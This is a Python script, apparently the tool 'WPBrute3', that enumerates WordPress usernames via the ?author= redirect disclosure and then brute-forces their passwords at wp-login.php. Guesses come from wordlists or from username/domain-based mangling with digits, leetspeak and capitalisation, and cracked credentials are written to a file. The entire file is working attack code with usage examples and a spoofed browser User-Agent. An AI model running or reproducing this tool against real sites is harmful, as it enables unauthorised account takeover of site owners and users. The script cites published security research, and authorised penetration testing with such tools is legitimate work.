#!/usr/bin/python

'''
Script to enumerate wordpress users using the technique discovered by Veronica
Valero and to brute force them following the idea of Ryan Dewhurst (@ethicalhack3r).

References: 

http://seclists.org/fulldisclosure/2011/May/493
http://www.ethicalhack3r.co.uk/security/patching-wordpress-username-disclosure/


'''

import urllib
import httplib
import sys
from urlparse import urlparse
import os
import random
import time
import getopt
import signal

from multiprocessing import Pool
from multiprocessing import Manager
from multiprocessing import Lock
import threading





MINUSERID = 1
MAXUSERID = 100

WORKERS = 5

VERSION = "0.1alpha"

winheaders = {
    "User-Agent" : "Mozilla/5.0 (Windows; Windows NT 6.1; WOW64; rv:2.0b2) Gecko/20100720 Firefox/4.0b2",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language" : "es-es,es;q=0.8,en-us;q=0.5,en;q=0.3",
    "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    }    

lock = Lock() 

manager = Manager()
users = manager.dict()
 

def enumUser(target, uri, ssl):

    c = httplib.HTTPConnection(target) if not ssl else httplib.HTTPSConnection(target)
    c.request('GET', uri)
    response = c.getresponse()
    c.close()

    if response.status == 301:
        loc = response.getheader('Location')
        user = urlparse(loc).path.strip().split('/')[-2]
        if len(user.strip()) > 0 and user.strip() not in users.keys():
            print "[*] Discovered user: %s" % user
            with lock:
                users[user.strip()] = None            


def testLogin(target, uri, user, pwd, ssl, pos, verbose):

    with lock:
       if users[user] != None:
           return

    if verbose:  print "[*] Trying %s/%s (%i remaining for %s)" % (user, pwd, pos, user)

    c = httplib.HTTPConnection(target) if not ssl else httplib.HTTPSConnection(target)
    p = {'log' : user, 'pwd' : pwd} 
    winheaders['Content-Type'] = 'application/x-www-form-urlencoded'
    c.request('POST', uri, urllib.urlencode(p), headers=winheaders)
    response = c.getresponse()
    c.close()
    
    if response.status != 200:
        print ''
        print "##################################################"
        print "Credentials guessed : %s:%s" %(user, pwd)
        print "##################################################"        
        lock.acquire()
        try:
            users[user] = pwd
            outputfile.write('%s:%s\n' %(user, pwd))
            outputfile.flush()
        except: pass
        finally:
            lock.release()

def manglePwd(seedlist, manglelevel=1):

    result = list(seedlist)

    for seed in seedlist:

        seed = seed.lower()

        #seedseed
        if len(seed) < 6:
            result.append(seed+seed)      

        # seed1, seed2, seed3
        # seed01, seed02.... seed98, seed99

        for i in range(0,10):
            result.append(seed + str(i))
            if len(seed) > 9: continue
            if manglelevel > 1:
                for x in range(0,10):
                    result.append(seed + str(i) + str(x))    



        if manglelevel > 2:

            #s33d
            leet = str(seed)
            leet = leet.replace('a', '4')
            leet = leet.replace('e', '3')
            leet = leet.replace('i', '1')
            leet = leet.replace('o', '0')
            leet = leet.replace('s', '5')
            #leet = leet.replace('b', '8')
            result.append(leet) 
        
        if manglelevel > 3: 

            # capitalize first letter            

            current = list(result)
            for s in current:
                result.append(s[0].capitalize() + s[1:])              
        
    return result

def print_logo():
    print '''

\t _    _____________            _         _____ 
\t| |  | | ___ \ ___ \          | |       |____ |
\t| |  | | |_/ / |_/ /_ __ _   _| |_  ___     / /
\t| |/\| |  __/| ___ \ '__| | | | __|/ _ \    \ \\
\t\  /\  / |   | |_/ / |  | |_| | |_|  __/.___/ /
\t \/  \/\_|   \____/|_|   \__,_|\__|\___|\____/  v%s    
        
                                Martin Obiols
                                http://blog.makensi.es

                                Thanks to:
                                    Veronica Valero
                                    Ryan Dewhurst (@ethicalhack3r)

''' % VERSION


def print_usage (error=None):
    print_logo()
    print 
    print 'Usage: %s -t http://domain.com/path ' % os.path.basename (sys.argv[0])
    print ' Parameters:'
    print '     -t --target      URL to wordpress app (mandatory)'
    print '     -u --user        Check only this user'
    print '     -w --wordlist    Use this wordlist for passwords'
    print '     -m --mangle      Try user/domain modifications as passwords. '
    print '                      Use -mm, -mmm... to increase mangling'
    print '                      Overrided by -w option'
    print ''
    print '     -o --output-file File to output guesses to'
    print '     -W --workers     Concurrent connections (Default=5)'
    print '     -S --ssl         Server uses SSL'
    print '     -U --showusers   Only discover usernames'
    print '     --gtfo           Ignonres platform compatibility'
    print ''
    print ''
    print '     Example: $ ./%s -t http://domain.com/blog -u admin -mmm' % os.path.basename(sys.argv[0])
    print ''

    if error:
            print '\n** %s' % error

if __name__ == "__main__":

    try:

        singleuser = wordlistmode = mangle = ssl = showonly = gtfo = False
        outputfile = sys.stdout
        target = None
        manglecount = 0    
        workers = WORKERS



        try:
            optlist, args = getopt.getopt(sys.argv[1:], "hu:w:mo:t:W:SU", ["help", "user=", "wordlist=", "mangle", "output-file=", "target=", "workers=", "ssl", "showusers", "gtfo"])
        except getopt.GetoptError, err:
                print 'Error: %s' % str(err)
                print 'For options: %s --help' % os.path.basename (sys.argv[0])
                sys.exit(2)


        for opt, args in optlist:
            if opt in ( "-h", "--help"):
                print_usage()
                sys.exit(0)
            elif opt in ("-u", "--user"):
                singleuser = True
                users[args] = None
            elif opt in ("-w", "--wordlist"):
                wordlistmode = True
                wordlist = open(args, 'r')
            elif opt in ("-m", "--mangle"):
                mangle = True
                manglecount += 1
            elif opt in ("-o", "--output-file"):
                outputfile = open(args, 'w+')
            elif opt in ("-t", "--target"):
                target = args
            elif opt in ("-W", "--workers"):
                workers = int(args)
            elif opt in ("-S", "--ssl"):
                ssl = True     
            elif opt in ("-U", "--showusers"):
                showonly = True       
            elif opt in ("--gtfo"):
                gtfo = True             

        if not target:
            print_usage("No target specified")
            sys.exit(2)

        from platform import system
        if system() != "Linux" and not gtfo: 
            print ''
            print "[*] This script was not tested on this platform. Please run it on Linux."
            print '[*] You can specify --gtfo option to ignore this check'            
            print ''
            sys.exit(1)



        target = urlparse(target)

        path = target.path

        if not path.endswith('/'): path += '/'

        winheaders['Host'] = target.netloc

        pool = Pool(processes=workers) 

        if not singleuser:
            print '## Discovering Wordpress users...\n'
            for i in range(MINUSERID,MAXUSERID+1):
                pool.apply_async(enumUser, (target.netloc, path + '?author=%i' % i, ssl,))                

        pool.close()
        pool.join()    

        pool = Pool(processes=workers) 

        print "\n## Bruteforcing password for users: %s" % " ".join(users.keys())

        if not showonly:

            for user in users.keys():
                        
                if wordlistmode:                
                    passwords = wordlist
                    total = 0
                    for line in passwords: total += 1
                    passwords.seek(0)
                    print "## Using wordlist of %i total passwords" % total
                elif mangle:

                    seed = [user] + target.netloc.split('.')[:-1]
                    passwords = manglePwd(seed,manglecount)

                    print "## Mangling words for a total of %i passwords" % len(passwords)

                else:
                    passwords = [user]              
                    print "## Using username (%s) as password" % user
                  

                pos = 0            
                l = len(passwords) if not wordlistmode else total
                for pwd in passwords:
                    pos += 1
                    verbose = True if random.randint(1,1000) > 980 else False
                    pool.apply_async(testLogin, (target.netloc, path + 'wp-login.php', user, pwd, ssl, l-pos, verbose,))

                    if (users[user] != None): break
            

            time.sleep(1)
            pool.close()
            pool.join()

    except KeyboardInterrupt:
        # CTRL-C pretty handling
        print 'Keyboard Interruption!. Exiting.'
        pool.close()
        pool.join()        
        sys.exit(1)



